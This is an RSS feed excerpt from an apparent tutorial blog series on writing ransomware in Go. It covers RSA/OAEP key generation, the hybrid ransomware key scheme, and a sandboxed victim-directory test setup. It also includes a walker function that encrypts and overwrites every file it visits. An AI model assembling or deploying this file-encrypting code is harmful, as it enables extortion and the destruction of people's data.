<p>Our walker here is also very straightforward. If we come in with an error, we&rsquo;ll print and return it. Returning the error will stop the walker entirely, which we will use for debugging. However, on a customer&rsquo;s machine we would want to return nil to keep the dream alive. After that, we will return nil if it is a directory. Then we read the file, encrypt it, store the key, then write it back to disk.</p>

<pre><code class="language-golang">func walker(path string, info os.FileInfo, err error) error {
	if err != nil {
		log.Println(&quot;Error on:&quot;, path)
		return err
	}

	if info.IsDir() {
		log.Println(path, &quot;(d)&quot;)
		return nil
	}

	log.Println(path, &quot;(f)&quot;)

	pbs, err := ioutil.ReadFile(path)
	if err != nil {
		log.Fatal(err)
	}

	cbs, k = encryptHybrid(clientKey, bs)

	err = ioutil.WriteFile(path, cbs, 0666)
	if err != nil {
		log.Fatal(err)
	}

	eis = append(eis, EncryptionInfo{
		Path: path,
		Key: k,
	})

	return nil
}
</code></pre>

<p>With that we have the core functionality of a ransomware client in less than 350 lines of code. Pretty wild.</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Thu, 02 Sep 2021 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Asymmetric Crypto - Ransomware in Golang Part 2</title>
      <link>https://tacix.at/posts/Asymmetric Crypto - Ransomware in Golang Part 2.html</link>
      <description>Key generation and some scratch encryption...</description>
      <content:encoded><![CDATA[<p>If you&rsquo;re late to class, check out parts 0 and 1 at <a href="https://tacix.at">tacix.at</a>.</p>

<h2>Public Key Cryptography</h2>

<p>Two types of encryption schemes to be aware of are public key (or asymmetric) cryptography, and symmetric-key cryptography.</p>

<p>Symmetric cryptography uses the same key for encryption and decryption. For example, you have some plaintext and some key, <code>ciphertext = encrypt(plaintext, key)</code>. Going the other direction, with your ciphertext, <code>plaintext = decrypt(ciphertext, key)</code>. The tricky thing here is both parties need to have the secret key, so that needs to be sent over some secure channel.</p>

<p>Asymmetric cryptography is a little different. Each party has a public key and private key. They are as their names describe, one is sharable and the other is to be kept secret. The public key can encrypt data, and the private key can decrypt it. So if you had a message for me, and you had my public key, you could encrypt that message and only I (or whoever has gained possession of my private key) could decrypt it. Conversely, you can also sign and verify. You sign data using the private key, and anyone with the public key can verify that signature.</p>

<p>In the context of our ransomware, the client (the malware that runs on the victim&rsquo;s computer) will encrypt their own private key with the server&rsquo;s public key. This way, the server will hold the <em>key</em> (eh? eh?) to unlocking the victim&rsquo;s files.</p>

<h3>RSA</h3>

<p>RSA is a cryptosystem taking it&rsquo;s name from three individuals - Rivest, Shamir, and Adleman respectively. There is also a company called RSA, and they throw a big conference also called RSA where vendors go to sell security offerings to each other. Here we are talking about the cryptosystem though.</p>

<p>Trail of Bits sings RSA&rsquo;s praises in their blog post <a href="https://blog.trailofbits.com/2019/07/08/fuck-rsa/">Seriously, stop using RSA</a>. You should definitely read that post, you will learn some shit. We are going to disregard their advice though and use RSA because we are cowboy malware authors. At worst, our toy malware will have a crypto flaw in it that Brian Krebs will write a dissertation on after he doxxes us and a few other people who might be us for good measure, and then we will fix the flaw and carry on with our lives.</p>

<p>More likely, Golang&rsquo;s RSA library will have sane defaults and everything will be OK. Until, of course, a flaw is found in that library <a href="https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/">like these cool XML/SAML vulns</a>. C&rsquo;est la vie.</p>

<h3>Less talk, more typie typie</h3>

<p>Alright, 程序猿 reporting for duty. Here&rsquo;s a little scratch program that generates a key, encrypts a short plaintext, then decrypts it.</p>

<pre><code class="language-golang">// scratch/asym.go
package main

import (
	&quot;crypto/rand&quot;
	&quot;crypto/rsa&quot;
	&quot;crypto/sha256&quot;
	&quot;log&quot;
	&quot;fmt&quot;
)

func main() {
	privateKey, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		log.Fatal(err)
	}
	publicKey := privateKey.PublicKey

	p := []byte{0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5}
	fmt.Printf(&quot;Plaintext:\t%v\n&quot;, p)

	c, err := rsa.EncryptOAEP(
		sha256.New(), rand.Reader, &amp;publicKey, p, nil)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf(&quot;Ciphertext:\t%v\n&quot;, c)

	pd, err := rsa.DecryptOAEP(
		sha256.New(), rand.Reader, privateKey, c, nil)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf(&quot;Decrypted:\t%v\n&quot;, pd)
}
</code></pre>

<p>First things first, we&rsquo;re importing <code>crypto/rand</code>. This is a cryptographically secure random number generator and not a psuedo random number generator. Pseudo random number generators (i.e. <code>math/random</code>) use some cute math to produce seemingly random numbers which <a href="https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f">are often predictable</a>. This is fine in cases where it doesnt matter but cryptography is a case where it absolutely does matter.</p>

<p>Next we generate our private key by passing our source of random bytes and a key size in bits to <a href="https://golang.org/pkg/crypto/rsa/#GenerateKey"><code>rsa.GenerateKey()</code></a>. Here we are using 1024 which is small but <a href="https://crypto.stackexchange.com/a/1982/80736">hasn&rsquo;t been factored yet</a>. I think these can be any size but in practice you only ever seen multiples of 1024 (i.e. 2048, 3072, 4096). I&rsquo;ve seen keys smaller than 1024 that weren&rsquo;t multiples of 1024 but you get the point, generally powers of 2.</p>

<p>Then we get the public key out of the <a href="https://golang.org/pkg/crypto/rsa/#PrivateKey">private key struct</a>, and also make a 16 byte plaintext.</p>

<p>Onto the encryption. We&rsquo;re using <code>rsa.EncryptOAEP()</code> from Go&rsquo;s <code>crypto/rsa</code>package. Take a look at the <a href="https://golang.org/pkg/crypto/rsa/#EncryptOAEP">docs</a>, get comfortable reading docs when writing Go. They are your friend.</p>

<p>We have two choices for encryption in the <code>rsa</code> package. <code>EncryptPKCS1v15()</code> and <code>EncryptOAEP()</code>. Reading the package overview, or the <code>EncryptPKCS1v15</code> description, or the Trail of Bits blog post should guide you to <code>EncryptOAEP()</code>. From the package description -</p>

<blockquote>
<p>The original specification for encryption and signatures with RSA is PKCS #1 and the terms &ldquo;RSA encryption&rdquo; and &ldquo;RSA signatures&rdquo; by default refer to PKCS #1 version 1.5. However, that specification has flaws and new designs should use version 2, usually called by just OAEP and PSS, where possible.</p>
</blockquote>

<p>We&rsquo;ve decided on <code>OAEP</code>, let&rsquo;s review some of the parameters.</p>

<pre><code class="language-golang">c, err := rsa.EncryptOAEP(
		sha256.New(), rand.Reader, &amp;publicKey, p, nil)
</code></pre>

<p>The first is a hash function, which is used to hash the data gotten from the <code>random.Reader</code> which is passed in as the second parameter. This randomness is used to make sure the same plaintext doesn&rsquo;t encrypt to the same ciphertext. If it did, and say you were encrypting each letter you typed, someone could do a frequency analysis on the ciphertexts and figure out which ones corresponded to which keys. This would be bad.</p>

<p>Next we pass in a pointer to our public key and the plaintext. The last parameter is a label, if we were encrypting multiple things we might want to label them. That would ensure that one type of encrypted thing couldn&rsquo;t be confused as the other. We aren&rsquo;t though so that is <code>nil</code>.</p>

<p>There is also a spooky statement at the end of the description of <code>EncryptOAEP()</code> - <code>The message must be no longer than the length of the public modulus minus twice the hash length, minus a further 2.</code>. Alright, time for some math. Our public modulus is 1024 bits, a SHA256 is 32 bytes, and there are 8 bits in a byte. <code>1024 bits - (32 bytes * 2 * 8 bits/byte) - 2 bits = 510 bit message</code>. <code>510 bits / 8 bits/byte = 63.75</code>. Cool, so we can encrypt up to 63 bytes.</p>

<p>What happens if we try to encrypt 64? You can change the <code>p := []byte{...}</code> line to <code>p := make([]byte, 64)</code> and give it a shot. The function fails with the error <code>crypto/rsa: message too long for RSA public key size</code>.</p>

<p>Wow, look at all that stuff we just learned. Glad we chose to use RSA. <strong>Don&rsquo;t roll your own crypto</strong> is how they keep you <strong>IGNORANT</strong> of the government&rsquo;s <strong>MATH</strong> backdoors.</p>

<p><em>Disclaimer: We aren&rsquo;t rolling our own crypto here.</em></p>

<p>I&rsquo;ll do a post on ECDSA and U2F tokens in the future and we can learn a little bit about the government&rsquo;s new backdoored math.</p>

<p><em>Also Disclaimer: I have no evidence of backdoors.</em></p>

<h2>Standard Ransomware Crypto Scheme</h2>

<p>I mentioned in Post 0 that we&rsquo;ll be using the <a href="https://medium.com/@tarcisioma/ransomware-encryption-techniques-696531d07bb9">standard ransomware encryption scheme</a>. We will encrypt files with a symmetric key, we will encrypt those keys (they&rsquo;re small enough!) with the client&rsquo;s public key, and the client&rsquo;s private key will be encrypted with the server&rsquo;s public key. Follow that?</p>

<p>So the server&rsquo;s private key can decrypt the client&rsquo;s private key, which can in turn unlock the files&rsquo; encryption keys.</p>

<h2>De/Serialization</h2>

<p>That means we have to generate the server&rsquo;s keypair, save them, and be able to load them back up whenever the server starts. We also want to output the server&rsquo;s public key as bytes so that we can load them. Let&rsquo;s learn some terms.</p>

<p><strong>X.509</strong> - This is a <a href="https://en.wikipedia.org/wiki/X.509">standard</a> that defines the format of public key certificates.</p>

<p><strong>PKCS #1</strong> - <a href="https://en.wikipedia.org/wiki/PKCS_1">Public Key Cryptography Standards numero Uno</a>. This defined the RSA algorithm and properties.</p>

<p><strong>ASN.1</strong> - <a href="https://en.wikipedia.org/wiki/ASN.1">Abstract Syntax Notation 1</a> is an interface description format for defining data structures.</p>

<p><strong>DER</strong> - <a href="https://en.wikipedia.org/wiki/X.690#DER_encoding">Distinguished Encoding Rules</a> is a way to encode ASN.1 defined data. Described in the <code>X.690</code> standard, <code>nice0</code>.</p>

<h2>Key Generation</h2>

<p>Let&rsquo;s get to it then! We&rsquo;ll be generating a keypair, writing our RSA / PKCS1 keys out in an ASN.1 DER encoded format. For this one we&rsquo;re upping the bits to 2k48 because we&rsquo;ll be encrypting the client key (1k24 bits) and from our formula <code>(2048 bits - (32 bytes * 2 * 8 bits/byte) - 2) = 1534 bits</code>, AKA enough space to fit a 1024 bit key. We could go as low as a 1538 bit server key but using something that isn&rsquo;t a power of 2 would offend the divine numerology and our malware would no longer be blessed.</p>

<p>First, we don&rsquo;t want to overwrite our server keypair so we&rsquo;re going to check if those files exist.</p>

<pre><code class="language-golang">	_, errPub := os.Stat(&quot;key.pub&quot;)
	_, errPrv := os.Stat(&quot;key.prv&quot;)

	if errPub == nil &amp;&amp; errPrv == nil {
		pub, err := ioutil.ReadFile(&quot;key.pub&quot;)
		if err != nil {
			log.Fatal(err)
		}
		printBytes(pub)
		log.Fatal(&quot;keypair exists, will not overwrite&quot;)	
	}
</code></pre>

<p>Following that, we generate a key, get the DER encoded bytes of the public key, write them to a file, ditto for the private key.</p>

<pre><code class="language-golang">	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		log.Fatal(err)
	}

	pub := x509.MarshalPKCS1PublicKey(&amp;privateKey.PublicKey)
	err = ioutil.WriteFile(&quot;key.pub&quot;, pub, 0644)
	if err != nil {
		log.Fatal(err)
	}

	prv := x509.MarshalPKCS1PrivateKey(privateKey)
	err = ioutil.WriteFile(&quot;key.prv&quot;, prv, 0644)
	if err != nil {
		log.Fatal(err)
	}
</code></pre>

<p>We also add a cute little <code>printBytes()</code> function to pretty print our public key in a way we can just paste into our client. Note, we also print the bytes when the keys exist because we might want to reprint those.</p>

<pre><code class="language-golang">// util/genkey.go
package main

import (
	&quot;crypto/rand&quot;
	&quot;crypto/rsa&quot;
	&quot;crypto/x509&quot;
	&quot;fmt&quot;
	&quot;io/ioutil&quot;
	&quot;log&quot;
	&quot;os&quot;
)

func printBytes(pub []byte) {
	fmt.Printf(&quot;\tpub := []byte{&quot;)
	for i := range pub {
		if i &gt; 0 {
			fmt.Printf(&quot;,&quot;)
		}

		if i%8 == 0 {
			fmt.Printf(&quot;\n\t\t&quot;)
		}

		fmt.Printf(&quot; 0x%02x&quot;, pub[i])
	}
	fmt.Println(&quot; }&quot;)
}

func main() {
	_, errPub := os.Stat(&quot;key.pub&quot;)
	_, errPrv := os.Stat(&quot;key.prv&quot;)

	if errPub == nil &amp;&amp; errPrv == nil {
		pub, err := ioutil.ReadFile(&quot;key.pub&quot;)
		if err != nil {
			log.Fatal(err)
		}
		printBytes(pub)
		log.Fatal(&quot;keypair exists, will not overwrite&quot;)
	}

	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		log.Fatal(err)
	}

	pub := x509.MarshalPKCS1PublicKey(&amp;privateKey.PublicKey)
	err = ioutil.WriteFile(&quot;key.pub&quot;, pub, 0644)
	if err != nil {
		log.Fatal(err)
	}

	prv := x509.MarshalPKCS1PrivateKey(privateKey)
	err = ioutil.WriteFile(&quot;key.prv&quot;, prv, 0644)
	if err != nil {
		log.Fatal(err)
	}

	printBytes(pub)
}
</code></pre>

<p>Now we run it. I&rsquo;m going to do so in the <code>~/prog/rw/server/</code> directory which doesn&rsquo;t exist yet.</p>

<p>Worry if your&rsquo;s outputs the same key as mine and don&rsquo;t worry about the converse.</p>

<pre><code class="language-bash">$ mkdir server
$ cd server
$ go run ../util/genkey.go
	pub := []byte{
		0x30, 0x82, 0x01, 0x0a, 0x02, 0x82, 0x01, 0x01,
		0x00, 0xb4, 0x10, 0x46, 0xf7, 0x7e, 0x73, 0x72,
		0x22, 0x4a, 0xcf, 0x98, 0xc8, 0x60, 0x67, 0x6c,
		0x96, 0x0b, 0xf9, 0x42, 0x5d, 0x05, 0xbf, 0x99,
		0x96, 0xe8, 0x69, 0xed, 0x95, 0xa4, 0x95, 0xbb,
		0xd2, 0x62, 0xa5, 0x35, 0x77, 0x97, 0x19, 0xc7,
		0x09, 0x92, 0x61, 0xd9, 0x5f, 0xea, 0x3e, 0x49,
		0xf5, 0x3f, 0x6f, 0x84, 0x21, 0x94, 0xc9, 0xda,
		0xfd, 0x20, 0x62, 0xc4, 0x61, 0x7c, 0x86, 0xfc,
		0xd6, 0x1f, 0xc8, 0x35, 0x2a, 0x78, 0xd5, 0x3e,
		0xb8, 0xd3, 0x3b, 0xa7, 0x3c, 0x9e, 0x82, 0x55,
		0xe3, 0x5b, 0x5c, 0x82, 0x50, 0xa5, 0x06, 0xf4,
		0x42, 0xfe, 0x93, 0xad, 0x61, 0x80, 0xff, 0xf2,
		0x8e, 0xe3, 0x78, 0xcb, 0xec, 0x91, 0x3f, 0x40,
		0xae, 0x71, 0x1f, 0x50, 0xb3, 0x1c, 0x1e, 0xdc,
		0x99, 0xed, 0xbb, 0x33, 0xe4, 0x6c, 0xb4, 0x84,
		0x18, 0x87, 0x51, 0xc7, 0x42, 0x0e, 0xa5, 0x80,
		0x4c, 0x36, 0xd2, 0xf2, 0x52, 0x58, 0x08, 0x26,
		0x6c, 0x36, 0x4b, 0x15, 0x22, 0x91, 0xd1, 0x92,
		0xcb, 0x82, 0x0f, 0xa8, 0x3f, 0xbe, 0x57, 0x2a,
		0xd0, 0xf2, 0x51, 0xa6, 0x3c, 0x92, 0xb9, 0x00,
		0x25, 0x23, 0xf4, 0x48, 0xa4, 0x8f, 0x09, 0xb4,
		0x5f, 0x42, 0x3f, 0x7d, 0x2d, 0xf8, 0xb0, 0x61,
		0x03, 0xcc, 0x93, 0x29, 0x63, 0x6a, 0xce, 0x1c,
		0x3f, 0x19, 0x7b, 0x03, 0x13, 0xd2, 0xd9, 0x99,
		0x85, 0x55, 0x2c, 0xfa, 0x19, 0x92, 0x18, 0x8a,
		0x39, 0x57, 0x4e, 0x22, 0xa3, 0x39, 0x93, 0xaa,
		0x5b, 0xaa, 0x2f, 0x2a, 0x41, 0xcb, 0xb6, 0xbc,
		0xde, 0x29, 0xe1, 0xbf, 0x4b, 0xbb, 0xac, 0x38,
		0x00, 0x1b, 0x4f, 0xb8, 0x4f, 0x39, 0xf6, 0xb0,
		0x0d, 0x92, 0x49, 0x0b, 0x60, 0x25, 0x15, 0xd2,
		0xad, 0xfa, 0x56, 0xb1, 0x0a, 0x94, 0xfc, 0xdc,
		0x55, 0xb9, 0x52, 0xe6, 0x64, 0x93, 0x85, 0x36,
		0x23, 0x02, 0x03, 0x01, 0x00, 0x01 }
$ ls 
key.prv  key.pub
</code></pre>

<h2>Conclusion</h2>

<p>Hopefully now we understand what asymmetric encryption is. We know that RSA has many pitfalls but Go provides some sane defaults as long as you can read. We can also generate the keypair for our server (yay).</p>

<p>In the next post we will get to write our ransomware client (also yay).</p>

<p>Now fuck off and do some exercise in the sun.</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Wed, 16 Dec 2020 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Building Blocks - Ransomware in Golang Part 1</title>
      <link>https://tacix.at/posts/Building Blocks - Ransomware in Golang Part 1.html</link>
      <description>Environment and victim directory setup...</description>
      <content:encoded><![CDATA[<p>In case you missed it, check out <a href="https://tacix.at/posts/Ransomware%20in%20Golang%20-%20Part%200.html">Part 0</a> which will serve as our design doc and outline while we&rsquo;re building this.</p>

<h2>Setup</h2>

<p>To get started you’ll need to <a href="https://golang.org/dl/">download Go</a> and follow the <a href="https://golang.org/doc/install">install instructions</a> for your operating system. Then you’ll create a directory for this project, I’ll be working out of <code>~/prog/rw/</code> where <code>~</code> is my home directory on whatever OS I’m working on.</p>

<p>Golang is cross platform, and we&rsquo;re not doing anything platform specific, so you&rsquo;re free to work wherever you&rsquo;d like. However, if you&rsquo;re looking to learn some basic skills, now would be a great time to start working with virtual machines!</p>

<p>I&rsquo;ve made some YouTube videos on how to get started with VirtualBox, you can get the links at <a href="https://cybering.cc/#00">cybering.cc</a>. It&rsquo;s super easy, if you can click through two installers, you should have no problem. The videos help through a couple gotchas. So if you&rsquo;re looking to learn about VMs or Linux, both of which are great skills for jobbos, give it a shot! Your malware will then be contained in a VM, as all malware should be.</p>

<h2>Victim Directory</h2>

<p>Since we will be repeatedly running and debugging our encryptor, we will need to set up a victim directory so we’re not encrypting our own data, especially when we do not have a decryptor! This directory should be replaceable so we can reinitialize it with ease. We’ll have a master directory and a clone of it to be our directory under test. This way, restoring should be as simple as deleting the directory under test and replacing it with master.</p>

<p>Let’s make <code>_victim/</code> and seed it with some data. We have a few requirements. We want to have a handful of files that we can check for validity. When you are decrypting there are small things you can mess up, so we want to make sure our files match their originals exactly. Having multiple file types will also help us when we start filtering by extension. A single flat folder will not be realistic, so we will create a directory structure in order to simulate a real file system traversal.</p>

<p>Yours doesn&rsquo;t have to match mine exactly, but here is a good template structure.</p>

<pre><code>_victim/
	simple.txt
	pics/
		raylan.jpg
		hello.jpg
	docs/
		Resume.pdf
	prog/
		main.go
		main.exe
</code></pre>

<p>The file <code>simple.txt</code> is just a text file that has <code>Hello world!</code> in it. In <code>pics/</code> I have a picture of my dog and another file I found on the internet. The <code>docs/</code> folder contains my resume which I had sitting around.</p>

<p>For the dummy <code>prog/</code> folder, we can use this to test our Golang installation. My <code>main.go</code> file has the following contents.</p>

<pre><code class="language-golang">package main

import (
	&quot;fmt&quot;
)

func main() {
	fmt.Println(&quot;Greetings from Go!&quot;)
}
</code></pre>

<p><em>We&rsquo;ll be working a lot from the command line. If you&rsquo;re on Linux the provided terminal is great. On Windows, you could use command prompt, but I generally work from <a href="https://conemu.github.io/">ConEmu</a>. If you want to learn some command line basics, I have some videos <a href="https://cybering.cc/#01">here</a>.</em></p>

<p>Normally, as I&rsquo;m working I just run my Go files with something like <code>go run main.go</code> on the command line. To produce an executable though, we can use <code>go build main.go</code>. On Windows this will produce <code>main.exe</code>, if you are working on Linux (probably OSX too) you will get an exectuable called <code>main</code>, either is fine.</p>

<h2>Restore and Verify</h2>

<p>We&rsquo;re going to create a small utility for restoring our victim directory, and also for verifying that things have been decrypted correctly. Let&rsquo;s make a new directory <code>~/prog/rw/util</code>, then create the file <code>util.go</code> in there.</p>

<h3>Restoration</h3>

<p>Restoration is pretty simple in an OS specific context. On Linux it would simply be <code>rm -r victim</code> and <code>cp -r _victim victim</code>. To reliably copy a directory recursively though, there are a lot of edge cases. Thankfully other people have already done the work on this. We&rsquo;re going to use the package <code>github.com/otiai10/copy</code>.</p>

<p>Since <code>github.com/otiai10/copy</code> is an external package, in order to import it we will need to run <code>go get github.com/otiai10/copy</code> on the command line. That will download the package and store it so we don&rsquo;t get an error like the following when we try to run our util program.</p>

<pre><code>util\util.go:5:2: cannot find package &quot;github.com/otiai10/copy&quot; in any of:
        c:\go\src\github.com\otiai10\copy (from $GOROOT)
        C:\Users\tacixat\go\src\github.com\otiai10\copy (from $GOPATH)
</code></pre>

<p>We&rsquo;ll start with this in <code>util.go</code>. Give it a read through and I&rsquo;ll break it down section by section after. You can also try running it with <code>go run util/util.go</code>. Try adding on the flags <code>-verify</code> and <code>-restore</code> to the end of that and seeing how it handles them.</p>

<pre><code class="language-golang">package main

import (
	&quot;flag&quot;
	&quot;github.com/otiai10/copy&quot;
	&quot;log&quot;
	&quot;os&quot;
)

func main() {
	restore := flag.Bool(
		&quot;restore&quot;, false, &quot;restore victim directory from _victim&quot;)
	verify := flag.Bool(
		&quot;verify&quot;, false, &quot;verify files in victim directory&quot;)

	flag.Parse()

	if !*restore &amp;&amp; !*verify || *restore &amp;&amp; *verify {
		log.Fatal(&quot;Requires one of -verify or -restore.&quot;)
	}

	if *restore {
		err := os.RemoveAll(&quot;victim&quot;)
		if err != nil {
			log.Fatal(err)
		}

		err = copy.Copy(&quot;_victim&quot;, &quot;victim&quot;)
		if err != nil {
			log.Fatal(err)
		}
	} else if *verify {
		log.Fatal(&quot;Verify not implemented yet!&quot;)
	}
}
</code></pre>

<p>We start by importing a few packages. In Golang the packages should be listed in alphabetical order. You can do this automatically with <code>go fmt util/util.go</code>, which will tidy up other things about the file as well.</p>

<ul>
<li><a href="https://golang.org/pkg/flag"><code>flag</code></a> - Used for creating command line flags.</li>
<li><a href="https://pkg.go.dev/github.com/otiai10/copy"><code>github.com/otiai10/copy</code></a> - For copying our <code>_victim/</code> directory to <code>victim/</code>. Very straightforward package, only one function.</li>
<li><a href="https://golang.org/pkg/log"><code>log</code></a> - We&rsquo;ll use this one for printing instead of <code>fmt</code> and I&rsquo;ll explain the differences below.</li>
<li><a href="https://golang.org/pkg/os"><code>os</code></a> - Used to delete our current <code>victim/</code> directory, recursively.</li>
</ul>

<p>In our <code>main()</code> function we start by declaring two flags. The <code>:=</code> operator in Go is a short hand for declaring and defining a variable. This could also be done in two steps, like <code>var restore *Bool</code> and <code>restore = flag.Bool(...)</code> (the <code>*</code> here is saying it is a pointer type). The shorthand is nicer. Remember though, any assignment after declaration would just use <code>=</code>.</p>

<pre><code class="language-golang">	restore := flag.Bool(
		&quot;restore&quot;, false, &quot;restore victim directory from _victim&quot;)
	verify := flag.Bool(
		&quot;verify&quot;, false, &quot;verify files in victim directory&quot;)
</code></pre>

<p>These are pointers to booleans. Pointers are an address in memory that holds a value (in this case, a boolean value). In order to access the value, we dereference it with <code>*</code> when accessing the variable.</p>

<p>The next block is checking if either both <code>restore</code> and <code>verify</code> are false or both <code>restore</code> and <code>verify</code> are true. This is effectively an exclusive-or (xor). The <code>&amp;&amp;</code> (and) operator has a higher precendence than <code>||</code> (or). Think order of operations with multiplication and addition. If we either have both true or neither, we&rsquo;re going to call <code>log.Fatal(...)</code> which prints the message and exits the program.</p>

<p>The <code>log</code> package has a very similar API to <code>fmt</code>. The primary difference is that it prints to <code>stderr</code> instead of <code>stdout</code>, so it useful for program-related messages, rather than those meant for the end user. It also has nice utility functions like <code>Fatal</code> so we don&rsquo;t need to call both <code>fmt.Println(...)</code> and <code>sys.Exit(1)</code>.</p>

<p><em>If you need a referesher on boolean logic, check out video <a href="https://cybering.cc/#02">02.04</a>.</em></p>

<pre><code class="language-golang">	if !*restore &amp;&amp; !*verify || *restore &amp;&amp; *verify {
		log.Fatal(&quot;Requires one of -verify or -restore.&quot;)
	}
</code></pre>

<p>If all goes well, and we have run the program with either <code>-verify</code> or <code>-restore</code> then we&rsquo;ll move onto our if statement. Looking at the second part first, we just bail if we call <code>-verify</code> right now. We&rsquo;ll implement that in a minute.</p>

<pre><code class="language-golang">	} else if *verify {
		log.Fatal(&quot;Verify not implemented yet!&quot;)
	}
</code></pre>

<p>In our restore block we have two actions. The first is calling <code>os.RemoveAll()</code> on our <code>victim/</code> directory. This will recursively delete (meaning, delete the folder, and all of its contents) the current <code>victim/</code> dir. This is great when we have half of our ransomware working and we can encrypt the files but not recover them!</p>

<p>The pattern of <code>err = ...</code> and <code>if err != nil { ... }</code> is the standard pattern in Go for handling errors. This is to replace C-style errors where some functions return 0 for OK, and some return NULL (0) in error cases. Instead we just get an error, and the if the error is defined, we can handle it. In this case we handle it by printing it out and exiting the program. This is fine since we&rsquo;re not expecting to hit these errors very often.</p>

<p>The next block uses the <code>github.com/otiai10/copy</code> package to copy <code>_victim/</code> to <code>victim/</code>. Easy enough. Only thing to note, is see how we declare and define the first <code>err</code> with <code>:=</code> and the second we are just reassigning the existing <code>err</code> variable with <code>=</code>.</p>

<pre><code class="language-golang">		err := os.RemoveAll(&quot;victim&quot;)
		if err != nil {
			log.Fatal(err)
		}

		err = copy.Copy(&quot;_victim&quot;, &quot;victim&quot;)
		if err != nil {
			log.Fatal(err)
		}
</code></pre>

<h3>Verification</h3>

<p>Our goal with verification is to walk <code>_victim/</code> (the original) and for each file, <em>verify</em> that its SHA256 hash matches a corresponding file in <code>victim/</code>. There are three components to this.</p>

<ol>
<li>Reading files to get their bytes.</li>
<li>Taking the SHA256 of some bytes.</li>
<li>Walking a directory.</li>
</ol>

<p>Thankfully, these are all super easy to do. When I&rsquo;m working on projects I&rsquo;ll often have a <code>scratch/</code> directory where I prototype things and figure out how things work. I&rsquo;ll walk you through each of these in short scratch programs. Then we can put them together in <code>util.go</code>.</p>

<h4>Reading a file</h4>

<p>In Go, there are <a href="https://gobyexample.com/reading-files">a lot of ways</a> to read a file. We&rsquo;ll use a wrapper, <code>ioutil</code>, that will open and read the file then just give us back the slice of bytes (<code>bs</code>). We check the error and bail if we have one. Finally we cast our little slice of bytes to a string as we pass it to be printed out.</p>

<pre><code class="language-golang">// scratch/read.go
package main

import (
	&quot;io/ioutil&quot;
	&quot;log&quot;
)

func main() {
	bs, err := ioutil.ReadFile(&quot;victim/simple.txt&quot;)
	if err != nil {
		log.Fatal(err)
	}
	log.Println(string(bs))
}
</code></pre>

<h4>Hashing some bytes</h4>

<p>Taking a SHA256 is equally as easy. We import <code>crypto/SHA256</code> and pass in a (string cast to) a slice of bytes to <a href="https://golang.org/pkg/crypto/sha256/#Sum256"><code>sha256.Sum256()</code></a>. That gives us back an array of 32 bytes which contains the hash. We print that as hex, giving us a 64 character string.</p>

<pre><code class="language-golang">// scratch/sha256.go
package main

import (
	&quot;crypto/sha256&quot;
	&quot;log&quot;
)

func main() {
	input := &quot;Let's take the sha256 of these bytes!&quot;
	hash := sha256.Sum256([]byte(input))
	log.Printf(&quot;%x\n&quot;, hash)
}
</code></pre>

<p>If you&rsquo;re on Linux you can run the following to verify the output. It echos out the same string, <code>-n</code> for no trailing newline to match our input in the program. We pipe that to <code>sha256sum</code> and see that we&rsquo;re getting the same hash.</p>

<pre><code class="language-bash">echo -n &quot;Let's take the sha256 of these bytes!&quot; | sha256sum
</code></pre>

<p>If you haven&rsquo;t seen a hashing function before, SHA256 is a cryptographic hash. Cryptographic hashes are meant to take an arbitrary amount of data and map it to a fixed space (e.g. 32 bytes). They are meant to be infeasible to reverse, meaning you should only be able to discover the input that results in a certain hash through brute force. Collisions, while possible, should be rare enough to not be considered. Other hashing algorithms, such as <a href="https://www.mscs.dal.ca/~selinger/md5collision/">MD5</a> and <a href="https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html">SHA1</a> can be manipulated to create collisions. This breaks the hash.</p>

<p>For our purposes, since SHA256 is consistent, the same input should hash to the same output, so we&rsquo;ll use the hashes of two files to see if they are equivalent. This will help check that we are doing things correctly when decrypting.</p>

<h4>Walking a directory</h4>

<p>Finally we get to take a walk down directory lane. This is also super easy because someone has already done the hard work. We don&rsquo;t have to screw around with handling file system edge cases or writing a tree traversal. The <code>filepath</code> package has a <a href="https://golang.org/pkg/path/filepath/#Walk"><code>Walk()</code></a> function. You provide it with a starting directory and a visitor function that you define. The visitor function gets called on each file or directory.</p>

<p>If you check the docs you&rsquo;ll see that the function that <code>Walk()</code> takes as its second argument is of the type <code>WalkFunc</code>. That definition is just below. What it is saying is that you need to pass in a function that matches the <code>WalkFunc</code> prototype.</p>

<pre><code class="language-golang">type WalkFunc func(path string, info os.FileInfo, err error) error
</code></pre>

<p>In our case, this is <code>onVisit()</code>. In the docs you can check out the definition of the <code>os.FileInfo</code> interface, but the important bit is that it has an <code>IsDir()</code> function that returns true when the visitee (<code>path</code>) is a directory. When it is a directory we can ignore it and return early. On files, we&rsquo;ll print them out.</p>

<pre><code class="language-golang">// scratch/walk.go
package main

import (
	&quot;flag&quot;
	&quot;log&quot;
	&quot;path/filepath&quot;
	&quot;os&quot;
)

func onVisit(path string, fi os.FileInfo, err error) error {
	if fi.IsDir() {
		return nil
	}
	
	log.Println(path)
	return nil
}

func main() {
	dir := flag.String(&quot;dir&quot;, &quot;&quot;, &quot;Directory to walk.&quot;)
	flag.Parse()

	if len(*dir) == 0 {
		log.Fatal(&quot;Please provide a -dir...&quot;)
	}

	err := filepath.Walk(*dir, onVisit)
	if err != nil {
		log.Fatal(err)
	}
}
</code></pre>

<p>Give it a run and see how it works. You can also remove the <code>IsDir()</code> check and see it print out the directories too. Fun.</p>

<h4>Putting it all together</h4>

<p>Back in <code>util/util.go</code> we&rsquo;ll update our <code>else if *verify</code> block in <code>main()</code> to contain the following. You&rsquo;ll also need to update your imports of import.</p>

<pre><code class="language-golang">		err := filepath.Walk(&quot;_victim&quot;, onVisit)
		if err != nil {
			log.Fatal(err)
		}
</code></pre>

<p>Then the party heads over to the <code>onVisit()</code> function. We read and take the hash of the original. Then we read and take the hash of the copy. Finally we check that they match.</p>

